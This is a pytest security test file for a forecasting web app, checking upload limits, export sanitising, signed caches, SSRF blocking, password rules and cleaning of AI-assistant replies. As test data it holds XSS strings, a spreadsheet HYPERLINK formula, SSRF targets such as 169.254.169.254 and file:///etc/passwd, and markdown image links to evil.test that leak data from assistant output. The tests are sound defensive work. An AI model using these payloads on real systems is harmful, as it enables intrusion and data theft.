"""Security measures: upload limits, export sanitising, signed cache files, HTML escaping."""
from pathlib import Path

import pandas as pd
import pytest

from demandino import security
from demandino.security import UploadError

ROOT = Path(__file__).resolve().parent.parent


def test_rejects_binary_and_oversized_uploads():
    with pytest.raises(UploadError):
        security.read_csv_upload(b"\x00\x01\x02binary")
    with pytest.raises(UploadError):
        security.read_csv_upload(b"a,b\n" * 10, max_rows=3)


def test_export_neutralises_spreadsheet_formulas():
    df = pd.DataFrame({"product": ["=HYPERLINK(\"http://evil\")", "+1+1", "Mug"], "units": [1, 2, 3]})
    out = security.sanitize_export(df)
    assert out["product"].tolist() == ["'=HYPERLINK(\"http://evil\")", "'+1+1", "Mug"]
    assert "'=HYPERLINK" in security.safe_csv(df)


def test_signed_cache_rejects_tampering(tmp_path):
    path = tmp_path / "model.pkl"
    security.dump_signed({"a": 1}, path)
    assert security.load_signed(path) == {"a": 1}
    raw = bytearray(path.read_bytes())
    raw[-1] ^= 0xFF
    path.write_bytes(bytes(raw))
    assert security.load_signed(path) is None


def test_clean_text_strips_control_chars_and_limits_length():
    assert security.clean_text("ab\x00c\x1b" + "x" * 200, max_len=10) == "abcxxxxxxx"


def test_findings_html_is_escaped():
    from demandino.ui import _md_bold
    assert "<script>" not in _md_bold("**Name:** <script>alert(1)</script>")


# ------------------------------------------------- hardening added later
def test_md_safe_neutralises_markup_from_files():
    from demandino import ui
    evil = "![x](http://evil.example/a.png) [click](javascript:alert(1)) <img src=x> :red[hi] **b** $x$"
    out = ui.md_safe(evil)
    for escaped in (r"\!\[x\]\(", r"\]\(javascript", r"\<img", r"\:red\[", r"\*\*b\*\*", r"\$x\$"):
        assert escaped in out
    assert ui.md_safe("Plain mug 12") == "Plain mug 12"


def test_password_rules_and_address_limit():
    from demandino import db
    for weak in ("short", "password123", "aaaaaaaaaaaa", "ababababab", "my-bob-name-1"):
        with pytest.raises(db.AuthError):
            db.check_password(weak, "bob")
    db.check_password("correct horse battery", "bob")
    ip = "203.0.113.9"
    assert not db.ip_blocked(ip) and not db.ip_blocked(None)
    for _ in range(db.IP_MAX_FAILURES):
        db.record_failure(ip)
    assert db.ip_blocked(ip) and not db.ip_blocked("203.0.113.10")


def test_keys_are_listed_by_name_and_sessions_can_be_ended():
    from demandino import db
    uid = db.create_user("keys_test", "a very long password")
    db.set_secret(uid, "shopify_token", "VALUE-THAT-MUST-NOT-LEAK")
    assert db.secret_names(uid) == ["shopify_token"]
    assert "VALUE-THAT-MUST-NOT-LEAK" not in str(db.list_activity(uid))
    a, b = db.new_session(uid), db.new_session(uid)
    assert db.session_count(uid) == 2
    db.end_all_sessions(uid)
    assert db.session_user(a) is None and db.session_user(b) is None and db.session_count(uid) == 0


def test_failed_sign_ins_are_recorded_for_the_account():
    from demandino import db
    uid = db.create_user("audit_test", "a very long password")
    with pytest.raises(db.AuthError):
        db.authenticate("audit_test", "wrong password here")
    db.authenticate("audit_test", "a very long password")
    assert [e["detail"] for e in db.list_activity(uid)][:2] == ["Signed in", "Failed sign-in attempt"]


def test_uploaded_outside_factors_never_reach_the_disk_cache(tmp_path, monkeypatch):
    from demandino import state
    monkeypatch.setattr(state, "CACHE_DIR", tmp_path)
    assert state._disk_cached("model", "sample-x-drvabc", lambda: 1) == 1
    assert list(tmp_path.glob("*.pkl")) == []


def test_repository_has_no_secrets_and_protections_are_on():
    import importlib.util
    spec = importlib.util.spec_from_file_location("security_check", ROOT / "scripts" / "security_check.py")
    check = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(check)
    fake = "sk-" + "ant-" + "a" * 30
    assert check.find_secrets(fake) == ["Anthropic key"] and check.find_secrets("nothing here") == []
    assert check.scan_tracked() == []
    assert check.check_ignored() == []
    assert check.check_settings() == []


def test_large_order_files_stay_small_in_memory():
    import pandas as pd

    from demandino import baskets
    lines = pd.DataFrame({"order_id": [str(i) for i in range(200_000)], "product_id": "A"})
    m, products, n = baskets.matrix(lines)
    assert n == 200_000 and m.data.nbytes < 2_000_000  # a dense table would need far more


# ------------------------------------------------------------ attacks that must fail
@pytest.mark.parametrize("url", ["https://localhost/x", "https://localhost./x", "https://127.0.0.1/x", "https://2130706433/x",
                                 "https://0x7f.0.0.1/x", "https://[::1]/x", "https://shop.internal/x", "https://a.localhost/x",
                                 "http://example.com/x", "https://user:pw@example.com/x", "file:///etc/passwd"])
def test_store_addresses_cannot_reach_private_places(url):
    from demandino import integrations as ig
    with pytest.raises(ig.ConnectorError):
        ig._check_url(url)


@pytest.mark.parametrize("address", ["127.0.0.1", "10.0.0.5", "192.168.1.1", "169.254.169.254", "::1", "fd00::1",
                                     "::ffff:127.0.0.1", "100.64.0.1", "224.0.0.1"])
def test_names_that_resolve_to_private_addresses_are_refused(monkeypatch, address):
    import socket

    from demandino import integrations as ig
    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: [(2, 1, 6, "", (address, 443))])
    with pytest.raises(ig.ConnectorError, match="Private"):
        ig._public_addresses("innocent.example.com", 443)
    connection = ig._PublicHTTPSConnection("innocent.example.com", 443, context=ig._tls_context())
    with pytest.raises(ig.ConnectorError):  # at the moment of connecting too, so a name can't change afterwards
        connection.connect()


def test_keys_never_follow_redirects_elsewhere():
    import urllib.request

    from demandino import integrations as ig
    handler = ig._SameHostRedirect()
    req = urllib.request.Request("https://shop.example.com/a", headers={"Authorization": "Basic secret"})
    for target in ("https://evil.example.com/a", "http://shop.example.com/a"):
        with pytest.raises(ig.ConnectorError):
            handler.redirect_request(req, None, 302, "", {}, target)


def test_malformed_store_responses_get_a_clear_message():
    from demandino import integrations as ig
    with pytest.raises(ig.ConnectorError):
        ig._orders(b"not json", lambda page: page)
    budget = ig._Budget()
    budget.bytes = ig.MAX_TOTAL_BYTES
    with pytest.raises(ig.ConnectorError):
        budget.add(b"x", [])


def test_email_settings_cannot_probe_internal_servers():
    from demandino import integrations as ig
    for host, port in (("localhost", 587), ("10.0.0.1", 587), ("smtp.example.com", 6379)):
        with pytest.raises(ig.ConnectorError):
            ig.send_email(host, port, "u", "p", "a@example.com", "b@example.com", "s", "b")
    with pytest.raises(ig.ConnectorError):
        ig.send_email("smtp.example.com", 587, "u", "p", "a@example.com", ",".join(["b@example.com"] * 11), "s", "b")


def test_hostile_uploads_are_refused_before_using_memory():
    from demandino.data import prepare_sales
    centuries = pd.DataFrame({"date": ["1700-01-01", "2200-01-01", "2020-01-01", "2020-03-01"], "product_id": ["A", "A", "B", "B"],
                              "units_sold": 1, "price": 1.0})
    with pytest.raises(ValueError):
        prepare_sales(centuries[centuries["date"] > "1800"].assign(date=["2200-01-01", "1900-01-01", "2020-01-01"]))
    many = pd.DataFrame({"date": "2024-01-01", "product_id": [str(i) for i in range(5000)], "units_sold": 1, "price": 1.0})
    with pytest.raises(ValueError, match="products"):
        prepare_sales(many)
    wide = pd.DataFrame({"date": ["2015-01-01", "2024-01-01"] * 200, "product_id": [f"P{i // 2}" for i in range(400)],
                         "units_sold": 1, "price": 1.0})
    with pytest.raises(ValueError, match="too much history"):
        prepare_sales(wide)


def test_impossible_values_and_markup_in_files_are_removed():
    from demandino.data import prepare_sales
    days = pd.date_range("2024-01-01", periods=5)
    bad = pd.DataFrame({"date": days, "product_id": "A", "product_name": "<img src=x onerror=alert(1)>Mug",
                        "category": "<script>x</script>", "units_sold": [1, float("inf"), 1e30, 2, 3],
                        "price": [1.0, 1.0, 1.0, float("inf"), -5.0]})
    out = prepare_sales(bad)
    assert not out["product_name"].str.contains("[<>]").any() and not out["category"].str.contains("[<>]").any()
    assert out["units_sold"].abs().max() < 1e9 and out["price"].max() < 1e9 and (out["price"] >= 0).all()
    with pytest.raises(ValueError) as exc:
        prepare_sales(pd.DataFrame({"![x](http://evil.test/a.png)": [1]}))
    assert "evil.test/a.png)" not in str(exc.value) and "![" not in str(exc.value)
    with pytest.raises(security.UploadError) as exc:
        security.read_csv_upload(b'a,b\n"unclosed SECRETVALUE')
    assert "SECRETVALUE" not in str(exc.value)


def test_exports_catch_formulas_hidden_behind_spaces():
    assert security.sanitize_export(pd.DataFrame({"a": ["  =1+1", "\u00a0@x", "fine"]}))["a"].tolist() == ["'  =1+1", "'\u00a0@x", "fine"]


def test_assistant_answers_cannot_send_data_out():
    from demandino import assistant
    text = ("Sales ![x](https://evil.test/?d=secret) rose. ![y][ref] See [here](https://evil.test/p) or <https://evil.test/q>.\n"
            "[ref]: https://evil.test/z\nDone")
    out = assistant.clean_reply(text)
    assert "](" not in out and "![" not in out and "[ref]:" not in out and "<https" not in out and "Done" in out
    split = ["Look ![x](https://ev", "il.test/?d=1) now\nand [a", "](https://evil.test) end"]
    joined = "".join(assistant.safe_stream(iter(split)))
    assert "![" not in joined and "](" not in joined and "Look" in joined and "end" in joined


def test_server_assistant_key_has_limits():
    from demandino import assistant
    state = {}
    assert all(assistant.server_key_allowed(state) for _ in range(assistant.SERVER_KEY_PER_SESSION_HOUR))
    assert not assistant.server_key_allowed(state)
    assistant._usage.update(day=__import__("time").strftime("%Y-%m-%d"), count=assistant.SERVER_KEY_PER_DAY)
    assert not assistant.server_key_allowed({})
    assistant._usage.update(day="", count=0)


def test_accounts_cannot_fill_the_disk():
    from demandino import db
    uid = db.create_user("quota_test", "a very long password")
    original = db.MAX_SCENARIOS
    db.MAX_SCENARIOS = 2
    try:
        db.save_scenario(uid, "a", {}, {})
        db.save_scenario(uid, "b", {}, {})
        with pytest.raises(db.AuthError):
            db.save_scenario(uid, "c", {}, {})
    finally:
        db.MAX_SCENARIOS = original
    with pytest.raises(db.AuthError):
        db.set_setting(uid, "big", "x" * (db.MAX_SETTING_BYTES + 1))
    with pytest.raises(db.AuthError):
        db.set_secret(uid, "big", "x" * (db.MAX_SECRET_CHARS + 1))
    assert not db.signup_blocked("198.51.100.1")
    for _ in range(db.SIGNUPS_PER_ADDRESS):
        db.record_signup("198.51.100.1")
    assert db.signup_blocked("198.51.100.1") and not db.signup_blocked("198.51.100.2")


def test_personal_data_never_reaches_the_disk_cache(tmp_path, monkeypatch):
    from demandino import state
    monkeypatch.setattr(state, "CACHE_DIR", tmp_path)
    for key in ("upload-abc", "ws-1-2", "sample-2026-01-01-US-fx1.2000", "real-1-GB-blkabc", "sample-1-US-catabc", "sample-1-US-drvabc"):
        assert state._disk_cached("model", key, lambda: 1) == 1
    assert list(tmp_path.glob("*.pkl")) == []
    assert state._disk_cached("model", "sample-1-US", lambda: 1) == 1
    old = next(tmp_path.glob("*.pkl"))
    os_time = __import__("time").time() - (state.CACHE_DAYS + 1) * 86400
    __import__("os").utime(old, (os_time, os_time))
    state._remove_stale_cache()
    assert not old.exists()


def test_backups_are_private_complete_and_rotated(tmp_path):
    import importlib.util
    import sqlite3
    import stat
    source = tmp_path / "source.db"
    con = sqlite3.connect(source)
    con.execute("CREATE TABLE t (x)")
    con.execute("INSERT INTO t VALUES (1)")
    con.commit()
    con.close()
    spec = importlib.util.spec_from_file_location("backup", ROOT / "scripts" / "backup.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    folder = tmp_path / "backups"
    for stamp in ("20200101-000000", "20200102-000000", "20200103-000000"):
        (folder.mkdir(exist_ok=True), (folder / f"demandino-{stamp}.db").write_bytes(b"old"))
    made = module.backup(folder, keep=2, source=source)
    assert stat.S_IMODE(made.stat().st_mode) == 0o600 and stat.S_IMODE(folder.stat().st_mode) == 0o700
    assert sqlite3.connect(made).execute("SELECT x FROM t").fetchone() == (1,)
    assert len(list(folder.glob("*.db"))) == 2
